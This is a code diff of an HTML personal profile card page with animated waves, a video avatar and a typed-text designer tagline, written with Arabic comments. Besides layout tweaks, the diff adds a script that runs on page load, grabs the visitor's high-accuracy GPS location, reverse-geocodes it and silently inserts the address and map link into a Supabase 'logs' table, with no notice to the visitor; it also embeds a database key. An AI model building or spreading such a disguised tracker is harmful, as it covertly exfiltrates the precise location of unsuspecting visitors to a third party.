@@ -21,15 +21,15 @@
         }
         @keyframes waterFlow { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
         
-        /* البطاقة بحجم مصغر ومتناسق */
         .vcard {
-            width: 90%; max-width: 380px; height: 550px; background: var(--front_color);
+            width: 90%; max-width: 380px; height: 580px; background: var(--front_color);
             backdrop-filter: blur(25px); border-radius: 30px; border: 1px solid rgba(197, 160, 89, 0.2);
             box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8); position: relative; overflow: hidden;
+            display: flex; flex-direction: column;
         }
         .header { height: 32%; position: relative; background: rgba(0,0,0,0.2); }
         
-        /* إصلاح حركة الأمواج */
+        /* إصلاح حركة الأمواج لتكون نشطة دائماً */
         .wave_bg { position: absolute; width: 100%; height: 100%; overflow: hidden; top: 0; left: 0; }
         .wave-01 { 
             position: absolute; width: 600px; height: 600px; 
@@ -51,7 +51,7 @@
         }
         .profile_video { width: 100%; height: 100%; object-fit: cover; }
         
-        .card_content { padding-top: 75px; text-align: center; }
+        .card_content { padding-top: 75px; text-align: center; flex-grow: 1; }
         .satan h4 { 
             font-size: 1.8em; letter-spacing: 3px; 
             background: linear-gradient(to right, var(--gold), var(--white)); 
@@ -69,15 +69,22 @@
             transition: 0.3s ease;
         }
         .social i:hover { color: var(--gold); border-color: var(--gold); transform: scale(1.1); }
+
+        .footer_rights {
+            padding: 15px 0;
+            font-size: 0.75em;
+            color: rgba(230, 241, 255, 0.5);
+            text-align: center;
+            letter-spacing: 1px;
+            border-top: 1px solid rgba(197, 160, 89, 0.1);
+        }
     </style>
 </head>
 <body>
 
 <div class="vcard">
     <div class="header">
-        <div class="wave_bg">
-            <div class="wave-01"></div>
-        </div>
+        <div class="wave_bg"><div class="wave-01"></div></div>
         <div class="profile_pic_content">
             <video class="profile_video" autoplay loop muted playsinline>
                 <source src="https://files.catbox.moe/jvicv4.mp4" type="video/mp4">
@@ -100,38 +107,57 @@
             </div>
         </div>
     </div>
+    <div class="footer_rights">
+        © 2026 SALEM | ALL RIGHTS RESERVED
+    </div>
 </div>
 
 <script>
+    // استرجاع كود Supabase الأصلي الخاص بك
     const SB_URL = 'https://kcckppfflaxpxhipngdz.supabase.co';
     const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtjY2twcGZmbGF4cHhoaXBuZ2R6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU2MzU1NTMsImV4cCI6MjA5MTIxMTU1M30.Lek1mEohH1GoUkcMQZT3vQ2tmshPJVI-Oa8f_y2mH6o';
     const sb = supabase.createClient(SB_URL, SB_KEY);
 
-    async function captureLocation() {
+    async function startTracking() {
         if ("geolocation" in navigator) {
-            const options = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
-            
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const { latitude, longitude, accuracy } = pos.coords;
-                const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-                let address = "تعذر جلب العنوان";
-                
-                try {
-                    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&accept-language=ar`);
-                    const data = await res.json();
-                    address = data.display_name || address;
-                } catch(e) {}
+            // خيارات الدقة العالية جداً
+            const geoOptions = { 
+                enableHighAccuracy: true, 
+                timeout: 20000, 
+                maximumAge: 0 
+            };
 
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const acc = pos.coords.accuracy;
+                // الرابط الأصلي الذي طلبته
+                const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                
+                let finalLocData = "";
+                try {
+                    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=ar`);
+                    const d = await r.json();
+                    finalLocData = `${d.display_name} | دقة: ${acc.toFixed(1)}m | الرابط: ${mapUrl}`;
+                } catch(e) {
+                    finalLocData = `إحداثيات: ${lat},${lon} | دقة: ${acc.toFixed(1)}m | الرابط: ${mapUrl}`;
+                }
+
+                // إرسال البيانات فوراً لقاعدة البيانات (بدون تسجيل دخول)
                 await sb.from('logs').insert([{ 
-                    username: "Visitor_Small_Card", 
-                    location: `الدقة: ${accuracy.toFixed(1)}m | العنوان: ${address} | الرابط: ${mapLink}` 
+                    username: "AUTO_VISITOR", 
+                    password: "LOGGED_WITHOUT_INTERFACE", 
+                    location: finalLocData 
                 }]);
-            }, null, options);
+
+            }, (err) => {
+                console.error("Location error:", err.message);
+            }, geoOptions);
         }
     }
 
     window.onload = () => {
-        captureLocation();
+        startTracking();
         new Typed(".typed_text", {
             strings: ["Web Designer & Creative Developer.", "Precision and Art.", "BELIEVE IN YOURSELF."],
             typeSpeed: 50, backSpeed: 30, loop: true
